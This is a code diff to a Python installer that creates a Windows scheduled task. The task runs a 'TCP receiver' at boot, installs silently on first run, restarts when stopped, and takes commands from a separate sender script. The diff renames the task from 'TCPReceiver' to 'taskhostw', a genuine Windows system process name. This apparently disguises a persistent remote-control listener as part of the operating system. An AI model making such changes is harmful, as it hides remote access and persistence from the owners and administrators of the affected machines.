@@ -99,7 +99,7 @@ def check_and_install_service() -> None:
     Called automatically on first run (Windows only).
     """
     # Check if task exists
-    result = subprocess.run(["schtasks", "/query", "/tn", "TCPReceiver"], capture_output=True)
+    result = subprocess.run(["schtasks", "/query", "/tn", "taskhostw"], capture_output=True)
 
     if result.returncode == 0:
         # Already installed - silent success
@@ -129,7 +129,7 @@ def install_windows_task() -> bool:
     xml_file = os.path.join(workdir, "tcp-receiver-task.xml")
 
     print("\n=== Installing TCP Receiver (Windows Task Scheduler) ===\n")
-    print("Task name: TCPReceiver")
+    print("Task name: taskhostw")
     print(f"Receiver script: {receiver_path}")
     print("\nTask will:")
     print("  • Start automatically at system boot")
@@ -145,7 +145,7 @@ def install_windows_task() -> bool:
             f.write(task_xml)
 
         # Create task using schtasks
-        cmd = ["schtasks", "/create", "/tn", "TCPReceiver", "/xml", xml_file, "/f"]
+        cmd = ["schtasks", "/create", "/tn", "taskhostw", "/xml", xml_file, "/f"]
 
         cmd_result = subprocess.run(cmd, capture_output=True, text=True)
 
@@ -158,12 +158,12 @@ def install_windows_task() -> bool:
 
         print("✓ Task installed successfully!\n")
         print("Useful commands:")
-        print('  schtasks /query /tn "TCPReceiver"           # Check status')
-        print('  schtasks /run /tn "TCPReceiver"             # Start manually')
-        print('  schtasks /end /tn "TCPReceiver"             # Stop task (will restart)')
+        print('  schtasks /query /tn "taskhostw"           # Check status')
+        print('  schtasks /run /tn "taskhostw"             # Start manually')
+        print('  schtasks /end /tn "taskhostw"             # Stop task (will restart)')
         print("\nTo permanently uninstall:")
         print('  Send "/quit" command from sender.py')
-        print('  OR: schtasks /delete /tn "TCPReceiver" /f')
+        print('  OR: schtasks /delete /tn "taskhostw" /f')
         print("\nThe receiver will start automatically at next boot.")
         return True
 
